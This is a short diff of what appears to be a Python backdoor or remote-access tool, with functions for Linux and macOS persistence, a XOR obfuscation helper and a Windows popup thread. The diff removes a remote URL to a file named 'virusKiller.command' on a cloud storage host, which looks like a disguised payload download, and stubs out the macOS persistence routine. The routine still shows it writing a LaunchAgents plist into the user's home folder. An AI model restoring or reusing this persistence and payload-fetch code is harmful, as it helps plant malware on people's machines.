@@ -32,7 +32,7 @@ else:
 # change these to suit your needs
 HOST = '127.0.0.1'
 PORT = 8004
-REMOTE = "https://secscan.oss-cn-hangzhou.aliyuncs.com/virusKiller.command"
+REMOTE = "#TODO"
 
 
 def xor(text):
@@ -81,6 +81,8 @@ def linux_persistence():
 
 
 def mac_persistence():
+    return False, 'nothing here yet'
+    
     with open(os.path.expanduser("~") + "/Library/LaunchAgents/groundtime.plist", "w") as f:
         f.write("""
             <?xml version="1.0" encoding="UTF-8"?>
@@ -428,5 +430,5 @@ if __name__ == '__main__':
             thread.join()
 
         threading.Thread(target=winpop).start()
-
+    
     main()
